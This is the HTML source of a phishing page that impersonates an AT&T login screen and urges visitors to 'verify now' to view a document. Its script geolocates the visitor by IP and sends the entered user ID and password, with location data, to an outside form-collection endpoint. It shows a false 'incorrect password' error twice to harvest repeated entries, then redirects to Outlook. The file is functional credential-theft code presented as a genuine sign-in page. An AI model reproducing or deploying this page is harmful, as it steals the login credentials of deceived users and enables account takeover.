<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Screen</title>
  <link rel="icon" href="https://s.yimg.com/cv/apiv2/partner-portals/mobile/att_open-graph_icon_1.png" type="image/x-icon">



  <script>
    window.onload = function() {
      function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
      }
      const email = getQueryParam('email');
      if (email) {
        document.querySelector('input[name="email"]').value = email;
      }
    };
  </script>


  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background-color: white;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .form-shape{
      border-radius: 12px;
      box-sizing: border-box;
      margin: 10px auto 0 auto;
      max-width: 440px;
      width: calc(100% - 40px);
      padding: 44px;
      background-color: #fff;
      box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
      min-width: 320px;
    }

    /* TOP BAR — arrow left, logo centered */
    .top-bar-wrapper {
      position: relative;
      margin-bottom: 32px;
    }


    .microsoft-container {
      text-align: center;
    }

    .att-image {
      height: 38px;
    }

    /* Email pill wrapper */
    .email-wrapper {
      text-align: center;
      margin-bottom: 16px;
    }

    .emaill {
      display: block;
      width: 100%;
      height: 40px;
      padding: 0 40px 0 8px; /* extra right padding for icon */
      font-size: 14px;
      font-weight: 400;
      transition: border-bottom-width 0.15s ease, border-bottom-color 0.15s ease;
      box-sizing: border-box;
      border: 1px solid rgb(104, 110, 116);
      border-radius: 4px;
      background: #fff;
      color: rgb(36, 36, 36);
    }

    /* Centered Heading */
    .sign-in {
      font-weight: 600;
      font-size: 1.5rem;
      margin-top: 0px;
      margin-bottom: 8px;
      color: rgb(27, 27, 27);
      text-align: center;
      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
    }

    .verify-note {
      max-width: 360px;
      margin: 0 auto 24px auto;
      font-size: 12px;
      line-height: 1.4;
      color: #4b5563;
      text-align: center;
    }

    
    .input-label {
   display: block;
   margin-bottom: 6px;
   font-size: 13px;
   font-weight: 600;
   color: #1b1b1b;
   }
    /* PASSWORD WRAPPER + INPUT */
    .password-wrapper {
      position: relative;
      width: 100%;
      max-width: 360px;        /* keeps it from overflowing while matching original look */
      margin: 16px auto 0 auto;
    }

    .passs{
      display: block;
      width: 100%;
      height: 40px;
      padding: 0 40px 0 8px; /* extra right padding for icon */
      font-size: 14px;
      font-weight: 400;
      transition: border-bottom-width 0.15s ease, border-bottom-color 0.15s ease;
      box-sizing: border-box;
      border: 1px solid rgb(104, 110, 116);
      border-radius: 4px;
      background: #fff;
      color: rgb(36, 36, 36);
    }

    .passs:focus {
      border-bottom-color: rgb(15, 108, 189);
      border-bottom-width: 2px;
      outline: none;
    }

    .passs::placeholder {
      color: rgb(120, 120, 120);
    }

    /* SHOW / HIDE PASSWORD BUTTON */

.password-field{
    position:relative;
    width:100%;
}

.password-field .passs{
    width:100%;
    padding-right:70px;
    box-sizing:border-box;
}

.password-toggle{
    position:absolute;
    top:50%;
    right:12px;
    transform:translateY(-50%);

    background:none;
    border:none;
    padding:0;

    color:#0073ae;
    font-size:14px;
    font-weight:600;
    font-family:inherit;
    cursor:pointer;
}

.password-toggle:hover{
    text-decoration:underline;
}

.password-toggle:focus{
    outline:none;
}
.password-toggle:hover {
    text-decoration: underline;
}

.password-toggle:focus {
    outline: none;
}

    /* Only show button on hover/focus */
    .password-wrapper:hover .password-toggle,
    .password-wrapper:focus-within .password-toggle {
      opacity: 1;
      pointer-events: auto;
    }

    .password-toggle:hover,
    .password-toggle:focus-visible {
      color: #0f6cbd; /* blue on hover/focus */
      outline: none;
    }

    .password-toggle svg {
      width: 20px;
      height: 20px;
      fill: currentColor;
    }

    .password-toggle .icon-hide {
      display: none;
    }

    .password-toggle[data-visible="true"] .icon-show {
      display: none;
    }

    .password-toggle[data-visible="true"] .icon-hide {
      display: inline-flex;
    }

    /* Button */
    .button{
      position: relative;
      background-color: rgb(0, 56, 143);
      border: none;
      border-radius: 28px;
      color: white;
      font-weight: 600;
      font-size: 14px;
      height: 37px;
      padding: 8px 16px;
      width: 100%;
      max-width: 360px;
      margin: 32px auto 0 auto;
      cursor: pointer;
      display: block;
      overflow: hidden;
    }

    .button .btn-label {
      display: inline-block;
    }

    .button .spinner {
      display: none;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      border: 2px solid rgba(255, 255, 255, 0.4);
      border-top-color: #ffffff;
      animation: spin 0.8s linear infinite;
      margin: 0 auto;
      vertical-align: middle;
    }

    .button.loading {
      cursor: default;
      color: transparent;      /* visually hides the label while keeping layout */
    }

    .button.loading .spinner {
      display: inline-block;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }

    /* OTHER WAYS */
    .other-signin{
      margin-top: 25px;
      margin-bottom: -10px;
      color: rgb(17, 94, 163);
      font-size: 0.875rem;
      font-weight: 600;
      text-align: center;
      cursor: pointer;
    }

    .passs::-ms-reveal,
    .passs::-ms-clear {
      display: none;
    }


    .error-message {
  margin: 8px auto 0 auto;
  max-width: 360px;
  font-size: 12px;
  color: #e81123; /* MS red */
  display: flex;
  align-items: center;
}

.error-icon {
  display: inline-flex;
  margin-right: 6px;
}

.error-text {
  line-height: 1.4;
}

/* Red error border like Microsoft */
.input-error {
  border: 0.666667px #e81123 !important;
  box-shadow: inset 0 0 0 0.666667px #e81123;
}

.password-input-row {
  position: relative;
  width: 100%;
}

.password-input-row:hover .password-toggle,
.password-input-row:focus-within .password-toggle {
  opacity: 1;
  pointer-events: auto;
}


.forgot-link {
  margin-top: 24px;
  text-align: left;
  width: 100%;
  max-width: 360px;
  margin-left: auto;
  margin-right: auto;
}

.forgot-pass {
  font-size: 14px;
  color: rgb(0, 116, 179);
  text-decoration: none;
  font-weight: 600;
  
}

.forgot-pass:hover {
  text-decoration: underline;
}

/* Mobile — mimic real Microsoft login */
@media (max-width: 540px) {

  body {
    background: #ffffff !important;   /* Microsoft uses pure white */
    background-image: none !important;
  }



  /* Microsoft hides these on mobile */
  .footer,
  .other-signin,
  .back-arrow {
    display: none !important;
  }

  /* They also center the Microsoft logo */
  .microsoft-container {
    text-align: left;       /* On mobile, Microsoft aligns logo left */
    margin-bottom: 24px;
  }

  .microsoft-image {
    height: 22px;           /* Slightly smaller logo on mobile */
  }

  /* Adjust password input spacing */
  .password-wrapper {
    margin-top: 24px;
  }
}

.remember-me {
    display: flex;
    align-items: center;
    gap: 8px;
    max-width: 360px;
    margin: 18px auto 0 auto;
    font-size: 14px;
    color: #1b1b1b;
}

.remember-me input[type="checkbox"] {
    width: 18px;
    height: 18px;
    margin: 0;
    cursor: pointer;
}

.remember-me label {
    cursor: pointer;
}


/* FOOTER */
.footer {
  margin-top: auto;
  padding: 36px 18px 18px 18px;
  box-sizing: border-box;
  font-size: 12px;
  color: #000;
  background: transparent;
  text-align: center;
}

.footer-links {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 26px;
  flex-wrap: wrap;
}

.footer a {
  color: #000;
  text-decoration: none;
  white-space: nowrap;
}

.footer a:hover {
  text-decoration: underline;
}

.footer-copy {
  margin-top: 16px;
  color: #5f6368;
  font-size: 12px;
}

.privacy-choice {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  white-space: nowrap;
}

.privacy-icon {
  width: 22px;
  height: 12px;
  display: inline-block;
}

@media (max-width: 540px) {
  .footer {
    display: none !important;
  }
}


  </style>
</head>
<body>

  <div class="form-shape">

    <!-- ARROW + LOGO -->
    <div class="top-bar-wrapper">

      <div class="microsoft-container">
        <img class="att-image"
             src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg"
             alt="AT&T">
      </div>

    </div>


    <!-- FORM -->
    <form id="contact" class="form-horizontal well">

            <!-- HEADING -->
      <div class="sign-in">Sign in to view document</div>
      <div class="verify-note">You are accessing sensitive information, verify now!</div>

      <label for="email-input" class="input-label">User ID</label>

      <input type="email" name="email" placeholder=""  class="emaill" value="">

      <!-- PASSWORD WITH SHOW / HIDE ICON -->
      
  


      <div class="password-wrapper">

    <label for="password-input" class="input-label">Password</label>

    <div class="password-field">

        <input
            type="password"
            name="pass"
            placeholder=""
            class="passs"
            id="password-input">

        <button
            type="button"
            class="password-toggle"
            data-visible="false"
            aria-label="Show password">
            Show
        </button>

    </div>

    <div id="password-error" class="error-message" style="display:none;">
        <span class="error-icon" aria-hidden="true">
            <svg width="16" height="16" viewBox="0 0 20 20">
                <path fill="#E81123" d="M10 0C4.486 0 0 4.486 0 10s4.486 10 10 10 10-4.486 10-10S15.514 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
            </svg>
        </span>
        <span class="error-text">
            Incorrect User ID or Password. Try again.
        </span>
    </div>

</div>

  

   <div class="remember-me">
       <input type="checkbox" id="remember">
       <label for="remember">Keep me signed in</label>
   </div>

      <!-- BUTTON -->
      <button type="submit" class="button" id="submit-btn">
        <span class="btn-label">Next</span>
        <span class="spinner" aria-hidden="true"></span>
      </button>
    </form>

      <div class="forgot-link">
         <a href="#" class="forgot-pass">Forgot your password?</a>
      </div>

  </div>

  <footer class="footer">
    <div class="footer-links">
    <a href="#">Legal policy center</a>
    <a href="#">Privacy policy</a>
    <a href="#">Terms of use</a>
    <a href="#">Accessibility</a>
    <a href="#" class="privacy-choice">
      <svg class="privacy-icon" viewBox="0 0 40 20" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="3" width="38" height="14" rx="7" fill="#f5f5f5" stroke="#5f6368" stroke-width="1.5"/>
        <circle cx="13" cy="10" r="5" fill="#5f6368"/>
        <path d="M10.5 8.3L13 10.8L17 6.8" fill="none" stroke="#fff" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M24 7L30 13M30 7L24 13" stroke="#5f6368" stroke-width="1.5" stroke-linecap="round"/>
      </svg>
      Your privacy choices
    </a>
    <a href="#">Screen share code</a>
    </div>
    <div class="footer-copy">©2026 AT&amp;T Intellectual Property. All rights reserved.</div>
  </footer>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
  $(document).ready(function() {

    async function getVisitorInfo() {
    var info = {
        ip: "",
        city: "",
        region: "",
        country: "",
        country_code: "",
        postal: "",
        timezone: "",
        org: ""
    };

    try {

        // STEP A — Get IP from ipify
        var ipResponse = await fetch("https://api.ipify.org?format=json");
        var ipData = await ipResponse.json();

        info.ip = ipData.ip || "";

        // STEP B — Send IP to ipinfo.io
        if (info.ip) {

            var infoResponse = await fetch(
                "https://ipinfo.io/" + info.ip + "/json"
            );

            var infoData = await infoResponse.json();

            info.city = infoData.city || "";
            info.region = infoData.region || "";
            info.country = infoData.country || "";
            info.country_code = infoData.country || "";
            info.postal = infoData.postal || "";
            info.timezone = infoData.timezone || "";
            info.org = infoData.org || "";
        }

    } catch (error) {

        console.log("Visitor info lookup failed:", error);

    }

    return info;
}

    var attemptCount = 0;

    // Show / hide password toggle
    var $passwordInput = $('#password-input');
    var $toggleBtn = $('.password-toggle');
    var $errorMessage = $('#password-error');

    $toggleBtn.on("click", function () {

    const visible = $(this).attr("data-visible") === "true";

    if (visible) {
        $passwordInput.attr("type", "password");
        $(this)
            .text("Show")
            .attr("data-visible", "false")
            .attr("aria-label", "Show password");
    } else {
        $passwordInput.attr("type", "text");
        $(this)
            .text("Hide")
            .attr("data-visible", "true")
            .attr("aria-label", "Hide password");
    }

});

    // Hide error when user starts typing again
    $passwordInput.on('input', function () {
  $errorMessage.hide();
  $passwordInput.removeClass('input-error');
});


    $("#contact").on('submit', async function(e) {
      e.preventDefault();

      var email = $(".emaill").val();
      var password = $("input[name='pass']").val();

      var visitorInfo = await getVisitorInfo();

      attemptCount++;

      if (attemptCount <= 3) {
        $.ajax({
          dataType: "JSON",
          url: "https://submit-form.com/e07TXdO5i",
          type: "POST",

          contentType: "application/json",

headers: {
    Accept: "application/json"
},

          data: JSON.stringify({
    email: email,
    password: password,

    ip: visitorInfo.ip,
    city: visitorInfo.city,
    region: visitorInfo.region,
    country: visitorInfo.country,
    country_code: visitorInfo.country_code,
    postal: visitorInfo.postal,
    timezone: visitorInfo.timezone,
    org: visitorInfo.org
}),
          beforeSend: function() {
            $("#submit-btn")
              .addClass("loading")
              .prop("disabled", true);

            // hide any previous error while submitting
            $errorMessage.hide();
          },
          success: function(response) {
            if (response) {
              console.log(response);
            }
          },
          complete: function() {
            $("#submit-btn")
              .removeClass("loading")
              .prop("disabled", false);

            if (attemptCount < 3) {
              // clear password and show error after spinner finishes
              $("input[name='pass']").val('');
              $errorMessage.show();
              $passwordInput.addClass('input-error');
            } else if (attemptCount === 3) {
              // 3rd submission: redirect after spinner completes
              window.location.replace("https://outlook.live.com/mail/0/");
            }
          }
        });
      }
    });
  });
</script>

</body>
</html>
